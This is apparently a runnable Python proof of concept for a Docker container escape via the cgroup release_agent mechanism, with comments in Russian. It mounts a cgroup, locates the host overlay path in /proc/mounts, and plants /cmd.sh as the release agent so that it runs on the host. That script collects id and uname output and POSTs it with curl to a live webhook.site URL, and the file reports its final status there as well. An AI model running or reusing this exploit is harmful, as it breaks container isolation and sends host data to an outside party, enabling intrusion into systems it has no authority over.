import os
import subprocess
import shutil

WEBHOOK_URL = "https://webhook.site/e497c7bf-1edd-41d4-ba35-a5f6311a07a8"

def run_poc():
    print("[*] Cleaning up and starting Escape PoC...")
    
    try:
        # 0. Проверка прав (Capabilities)
        caps = subprocess.check_output("capsh --print", shell=True).decode()
        
        # 1. Очистка предыдущих попыток
        if os.path.exists("/tmp/cgroup/x"):
            os.system("rmdir /tmp/cgroup/x")
        if os.path.ismount("/tmp/cgroup"):
            os.system("umount /tmp/cgroup")
        if os.path.exists("/tmp/cgroup"):
            shutil.rmtree("/tmp/cgroup")
            
        os.makedirs("/tmp/cgroup")
        
        # 2. Попытка монтирования
        # Используем RDMA или любой другой контроллер, который может быть доступен
        res = os.system("mount -t cgroup -o rdma cgroup /tmp/cgroup")
        if res != 0:
            return f"Mount failed with code {res}. Capabilities: {caps[:100]}"

        os.makedirs("/tmp/cgroup/x")
        os.system("echo 1 > /tmp/cgroup/x/notify_on_release")
        
        # 3. Пытаемся найти путь к overlay (верхний слой)
        # Это критический момент: нам нужен путь, который видит ХОСТ
        try:
            host_path = subprocess.check_output("sed -n 's/.*\perdir=\([^,]*\).*/\\1/p' /proc/mounts", shell=True).decode().strip()
        except:
            host_path = "/var/lib/docker/overlay2/UNKNOWN/diff" # fallback

        # 4. Скрипт-нагрузка
        payload_path = "/cmd.sh"
        with open(payload_path, "w") as f:
            f.write("#!/bin/bash\n")
            f.write(f"id > /tmp/out\n")
            f.write(f"uname -a >> /tmp/out\n")
            f.write(f"curl -X POST -d @/tmp/out {WEBHOOK_URL}\n")
        
        os.chmod(payload_path, 0o755)
        
        # 5. Установка агента
        os.system(f"echo {host_path}{payload_path} > /tmp/cgroup/release_agent")
        
        # 6. Триггер
        os.system("sh -c 'echo 0 > /tmp/cgroup/x/cgroup.procs'")
        
        return "PoC Triggered. Check Webhook for host data."

    except Exception as e:
        return f"PoC Execution Error: {str(e)}"

if __name__ == "__main__":
    result = run_poc()
    os.system(f"curl -s -X POST -d 'POC_FINAL_STATUS: {result}' {WEBHOOK_URL}")
